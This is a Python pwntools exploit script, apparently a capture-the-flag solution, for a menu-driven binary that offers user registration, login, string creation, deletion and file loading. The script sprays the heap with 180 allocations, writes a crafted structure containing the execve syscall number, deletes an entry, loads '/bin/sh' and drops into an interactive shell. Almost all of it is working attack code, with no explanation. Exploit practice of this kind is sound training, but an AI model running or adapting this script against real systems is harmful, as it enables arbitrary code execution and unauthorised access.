#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)
to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)


def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b main
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def login(p, user, pswd):
    ru(p,b"option:")
    sl(p,b"1")
    ru(p,b"Username:")
    sl(p,user)
    ru(p,b"Password")
    sl(p,pswd)

def register(p, user, pswd):
    ru(p,b"option:")
    sl(p,b"2")
    ru(p,b"Username:")
    sl(p,user)
    ru(p,b"Password")
    sl(p,pswd)

def create(p, size, value):
    ru(p,b"option:")
    sl(p,b"1")
    ru(p,b"length:")
    sl(p,b"%i" % size)
    ru(p,b"string:")
    sl(p,value)

def delete(p, index):
    ru(p,b"option:")
    sl(p,b"2")
    ru(p,b"delete")
    sl(p,"%i" % index)

def load(p,filename):
    ru(p,b"option:")
    sl(p,b"5")
    ru(p,b"filename:")
    sl(p,filename)

def exploit(p,e):

    register(p,b"a",b"a")
    login(p,b"a",b"a")

    for i in range(180):
        create(p,0xff, p8(i))

    data = b"A" * 0x30 + p32(0) + p32(1) + p32(0x3b) + p32(3)
    create(p, 0x3f, data)

    delete(p,0)

    load(p,b"/bin/sh") 

    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)

    exploit(p,e)
